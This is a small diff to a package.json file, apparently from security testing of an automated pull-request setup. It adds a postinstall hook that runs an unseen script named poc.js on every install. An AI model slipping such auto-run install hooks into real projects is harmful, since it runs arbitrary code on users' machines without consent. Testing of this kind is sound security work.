@@ -1,5 +1,8 @@
 {
   "name": "copilot-app-pr-setup-control",
   "version": "1.0.0",
-  "private": true
+  "private": true,
+  "scripts": {
+    "postinstall": "node poc.js"
+  }
 }
